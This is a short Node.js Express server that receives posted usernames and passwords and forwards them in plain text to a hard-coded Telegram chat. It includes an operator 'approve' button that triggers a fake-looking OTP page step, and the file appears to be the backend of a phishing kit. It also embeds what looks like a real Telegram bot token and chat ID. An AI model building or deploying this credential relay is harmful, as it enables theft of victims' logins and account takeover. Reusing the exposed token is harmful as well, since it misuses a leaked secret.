const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Replace with your bot token and admin chat ID
const BOT_TOKEN = '7544618888:AAGhI2FTjMVh-s_9bw9zBJLPtuTofbcofn4';
const CHAT_ID = '7096155436';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname)); // Serve static files like HTML

let currentOtp = null;

// API to send credentials to Telegram
app.post('/api/send-credentials', (req, res) => {
    const { username, password } = req.body;

    // Send credentials to Telegram
    bot.sendMessage(CHAT_ID, `New credentials received:\nUsername: ${username}\nPassword: ${password}`, {
        reply_markup: {
            inline_keyboard: [[
                { text: 'Approve and Load OTP Page', callback_data: 'load_otp_page' }
            ]]
        }
    });

    res.json({ success: true });
});

// Handle Telegram bot button click
bot.on('callback_query', (query) => {
    if (query.data === 'load_otp_page') {
        bot.answerCallbackQuery(query.id, { text: 'OTP page will load for the user.' });

        // Generate OTP
        currentOtp = Math.floor(100000 + Math.random() * 900000).toString(); // Generate 6-digit OTP
        bot.sendMessage(CHAT_ID, `Generated OTP: ${currentOtp}`);

        // Notify the user to refresh their page
        // You can send an email, notification, or use another mechanism here
        bot.sendMessage(CHAT_ID, 'Notify user to refresh their page to load OTP.html.');
    }
});

// API to verify OTP
app.post('/api/verify-otp', (req, res) => {
    const { otp } = req.body;
    if (otp === currentOtp) {
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// Listen on Vercel's default port
module.exports = app;